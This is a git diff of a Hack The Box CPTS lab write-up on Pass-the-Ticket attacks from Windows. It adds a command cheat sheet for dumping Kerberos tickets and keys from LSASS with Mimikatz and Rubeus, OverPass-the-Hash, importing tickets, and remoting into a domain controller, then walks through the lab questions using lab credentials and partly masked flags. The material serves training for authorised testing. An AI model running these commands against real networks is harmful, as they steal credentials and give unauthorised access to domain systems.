@@ -1,127 +1,210 @@
 ### CPTS / HTB Penetration Tester Path <br>
-### Password Attacks: Pass The Ticket (PtT) from Windows <br>
-<mark>hook it up with a follow if this helps.</mark> <br>
+### Password Attacks - Pass the Ticket (PtT) from Windows <br>
+<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
 🐦: @<a href="https://x.com/st8less">**st8less**</a>
 
 <br>
 <br>
 
-IP: 10.129.126.191
+---
 
-RDP to 10.129.126.191 (ACADEMY-PWATTACKS-LM-MS01) with user "Administrator" and password `'AnotherC0mpl3xP4$$'`
+### Pass the Ticket (PtT) from Windows
+
+
+
+Kerberos = ticket-based; instead of sending a password to every service, the client presents a service-specific ticket.
+
+| Ticket | Purpose |
+|---|---|
+| `TGT` (Ticket Granting Ticket) | Obtained by encrypting a timestamp with the user's password hash → from KDC |
+| `TGS` (Service Ticket) | Requested with TGT to access a particular service |
+
+PtT = present a stolen ticket (TGT or TGS) instead of authenticating from scratch.
+
+#### Harvest tickets from LSASS — Mimikatz
+
+```diff
++ mimikatz # privilege::debug
++ mimikatz # sekurlsa::tickets /export
+```
+
+<br>
+
+Output: `.kirbi` files in CWD. Format `[luid]-N-N-flags-user@service-domain.kirbi`. Tickets ending in `$` = computer accounts. Tickets with service `krbtgt` = TGT for that user.
+
+#### Rubeus dump — Base64 ticket export
+
+```diff
++ c:\tools> Rubeus.exe dump /nowrap
+```
+
+<br>
+
+Both tools require admin to grab everything.
+
+#### Pass the Key / OverPass the Hash
+
+Convert an NT hash / AES key into a TGT (cross-protocol). Mimikatz `sekurlsa::ekeys` dumps the user's Kerberos keys:
+
+```diff
++ mimikatz # sekurlsa::ekeys
+```
+
+<br>
+
+Then OverPass the Hash with mimikatz (admin required):
+
+```diff
++ mimikatz # sekurlsa::pth /domain:<domain> /user:<user> /ntlm:<NThash>
+```
+
+<br>
+
+Or Rubeus `asktgt` (no admin required):
+
+```diff
++ c:\tools> Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<aes256> /nowrap
+```
+
+<br>
+
+Note: AES is preferred — using rc4_hmac (NTLM) on a 2008+ domain may trigger encryption-downgrade detection.
+
+#### Pass the Ticket — multiple methods
+
+Rubeus + `/ptt` — request and import in one step:
+
+```diff
++ c:\tools> Rubeus.exe asktgt /domain:<domain> /user:<user> /rc4:<NThash> /ptt
+```
+
+<br>
+
+Import a `.kirbi` via Rubeus:
+
+```diff
++ c:\tools> Rubeus.exe ptt /ticket:<filename>.kirbi
+```
+
+<br>
+
+Convert `.kirbi` → Base64:
+
+```diff
++ PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
+```
+
+<br>
+
+Pass via Base64 string:
+
+```diff
++ c:\tools> Rubeus.exe ptt /ticket:<base64>
+```
+
+<br>
+
+Mimikatz import:
+
+```diff
++ mimikatz # kerberos::ptt "<path-to-kirbi>"
+```
+
+<br>
+
+#### PowerShell Remoting after PtT
+
+```diff
++ c:\tools>powershell
++ PS C:\tools> Enter-PSSession -ComputerName DC01
+```
+
+<br>
+
+Optional sacrificial logon session via Rubeus (preserves existing TGTs):
+
+```diff
++ C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+```
+
+<br>
+
+---
+
+<br>
+
+### Exercise
+
+IP: 10.129.126.191 — RDP as `Administrator` / `'AnotherC0mpl3xP4$$'`
 
 ---
 
 ### Question 1:
 Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?
 
-RDP into the winbox as the admin. Then lets give ole' mimikatz a whirl:
+RDP as admin, run mimikatz:
+
 ```diff
 + c:\tools>mimikatz.exe
-```
-```diff
 + mimikatz # privilege::debug
-```
-
-	Privilege '20' OK
-```diff
 + mimikatz # sekurlsa::tickets /export
 ```
 
-This will output a ton, but if you look in the Tools directory in explorer you will see a bunch of dumped tickets. Upon further inspection we can see that only three of them have user's names.
+<br>
 
-🚩 found **3**.
+#### Listing the dumped `.kirbi` files in `c:\tools\` shows three with user names (rest are computer accounts).
+
+&#x1F6A9; found **3**.
 
 ---
 
 ### Question 2:
 Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder `\\DC01.inlanefreight.htb\john`
 
-Use john's saved TGT to PtT:
 ```diff
 + mimikatz # kerberos::ptt "C:\tools\[0;46a9b]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
-```
-
-Then use this to open a new term window:
-```diff
 + mimikatz # misc::cmd
 ```
 
-In this new window we can map the network share to an open drive letter (TEMPORARILY) with pushd:
+<br>
+
+In the new cmd window — temporarily map the share with `pushd`:
+
 ```diff
 + c:\Users\john>pushd \\DC01.inlanefreight.htb\john
-```
-
-Now we're pushed into Z: which is a temp map of the network share:
-```diff
-+ Z:\>dir
-```
-
-	 Volume in drive Z has no label.
-	 Volume Serial Number is B8B3-0D72
-	
-	 Directory of Z:\
-	
-	07/14/2022  07:25 AM    <DIR>          .
-	07/14/2022  07:25 AM    <DIR>          ..
-	07/14/2022  03:54 PM                30 john.txt
-	               1 File(s)             30 bytes
-	               2 Dir(s)  18,265,579,520 bytes free
-```diff
 + Z:\>type john.txt
 ```
 
 	Learn1ng_M0r3_Tr1cks_with_J0hn
 
-And you can use popd to unmap:
 ```diff
 + Z:\>popd
 ```
 
-	c:\Users\john>
-
-🚩 found **Learn1ng_M0r3_Tr1c--edit--ks_with_J0hn**.
+&#x1F6A9; found **Learn1ng_M0r3--edit--_Tr1cks_with_J0hn**.
 
 ---
 
 ### Question 3:
 Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt
 
-Lets head back to tools and run a freshie mimikatz:
 ```diff
 + c:\tools>mimikatz.exe
-```
-```diff
 + mimikatz # privilege::debug
-```
-
-	Privilege '20' OK
-
-Now do the dang ptt with john's previously saved ticket:
-```diff
 + mimikatz # kerberos::ptt "[0;46a9b]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
-```
-
-	* File: '[0;46a9b]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK
-
-Cool now we can exit mimikatz, make sure you say bye! back.
-```diff
 + mimikatz # exit
 ```
 
-	Bye!
+<br>
 
-Now open a PS and use the Enter-PSSession cmdlet to pop a shell to the domain controller:
+PSRemoting into DC01:
+
 ```diff
 + c:\tools>powershell
-```
-```diff
 + PS C:\tools> Enter-PSSession -ComputerName DC01
-```
-```diff
 + [DC01]: PS C:\Users\john\Documents> type C:\john\john.txt
 ```
 
 	P4$$_th3_Tick3T_PSR
 
-🚩 found **P4$$_th3_Tic--edit--k3T_PSR**.
+&#x1F6A9; found `P4$$_th3_Tick--edit--3T_PSR`.
